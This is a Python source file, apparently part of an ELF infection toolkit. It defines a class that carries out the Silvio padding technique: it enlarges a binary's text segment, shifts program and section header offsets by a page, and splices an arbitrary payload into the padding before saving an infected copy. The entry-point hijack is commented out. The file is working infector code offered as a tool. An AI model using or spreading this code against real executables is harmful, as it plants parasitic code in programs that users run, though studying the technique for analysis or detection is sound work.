from infections.infector import Infector
from ELF.elf import Elf
from ELF.elf_utils import get_text_phdr
from mmap import PAGESIZE


class SilvioPaddingInfector(Infector):

	def infect(self, elf_obj, infected_name, payload):
		print('[*] Infecting using silvio padding.\n')
		
		print('[1] Increase ehdr->e_shoff by PAGE_SIZE ({}):'.format(PAGESIZE))
		elf_obj.ehdr['e_shoff'] += PAGESIZE
		print('[1] Increased ehdr->e_shoff: {}\n'.format(elf_obj.ehdr['e_shoff']))

		print('[2] Locating text segment phdr\n')
		text_phdr = get_text_phdr(elf_obj.phdrs)

		# print('\t[2.1] Modifying entry point to payload:')
		# elf_obj.ehdr['e_entry'] = text_phdr['p_vaddr'] + text_phdr['p_filesz']
		# print('\t[2.1] Executable Entry: {}\n'.format(hex(elf_obj.ehdr['e_entry'])))

		print('\t[2.2] Increase text_phdr->p_filesz by the length of the payload:')
		original_text_filesz = text_phdr['p_filesz']
		parasite_vaddr = text_phdr['p_vaddr'] + original_text_filesz
		text_phdr['p_filesz'] += len(payload)
		print('\t[2.2] text-segment p_filesz: {}\n'.format(text_phdr['p_filesz']))

		print('\t[2.3] Increase text_phdr->p_memsz by the length of the payload:')
		text_phdr['p_memsz'] += len(payload)
		print('\t[2.3] text-segment p_memsz: {}\n'.format(text_phdr['p_memsz']))

		for phdr in elf_obj.phdrs:
			if phdr['p_offset'] > text_phdr['p_offset'] + original_text_filesz:
				phdr['p_offset'] += PAGESIZE

		for shdr in elf_obj.shdrs:
			if shdr['sh_addr'] > parasite_vaddr:
				shdr['sh_offset'] += PAGESIZE
			elif shdr['sh_addr'] + shdr['sh_size'] == parasite_vaddr:
				shdr['sh_size'] += len(payload)

		new_file_content = elf_obj.file_content
		elf_obj.file_content = new_file_content[:text_phdr['p_offset'] + original_text_filesz]
		elf_obj.file_content += payload.ljust(PAGESIZE, b'\xcc')
		elf_obj.file_content += new_file_content[text_phdr['p_offset'] + original_text_filesz:]
		elf_obj.save_as(infected_name)






